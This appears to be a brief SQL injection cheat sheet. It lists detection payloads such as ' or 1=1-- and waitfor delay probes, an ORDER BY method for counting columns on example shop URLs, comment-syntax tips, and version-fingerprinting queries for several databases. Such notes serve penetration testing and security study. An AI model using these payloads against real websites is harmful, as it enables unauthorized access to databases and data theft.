###Detection###

In most of cases SQL Injection can be detected easily by providing invalid parameters like:
', '' a' or 1=1--, "a"" or 1=1--", or a = a, a' waitfor delay '0:0:10'--, 1 waitfor delay '0:0:10'--, %26, ' or username like '% etc. and observe the changes in the behavior of the application.

After determining if the website is vulnerable to SQL Injection, try to find the number of columns to extract information.

# order by command can come in use to determine that: If order by query gives an error on order by 6 and not on order by 5, it means the database has 5 columns.
--> www.onlineshopping.com/products.php?pid=8 order by 1 -- //  
--> www.onlineshopping.com/products.php?usr=b' order by 3 -- // (If the parameter is a string then you need to add ' after it.)

To preserve the space after -- add any character after that so that space doesn't get ignored in the HTTP request. Might also use #, /* */ for comments depending on the SQL database provider

Oracle 	SELECT banner FROM v$version
SELECT version FROM v$instance
Microsoft 	SELECT @@version
PostgreSQL 	SELECT version()
MySQL 	SELECT @@version 

For more: https://portswigger.net/web-security/sql-injection/cheat-sheet
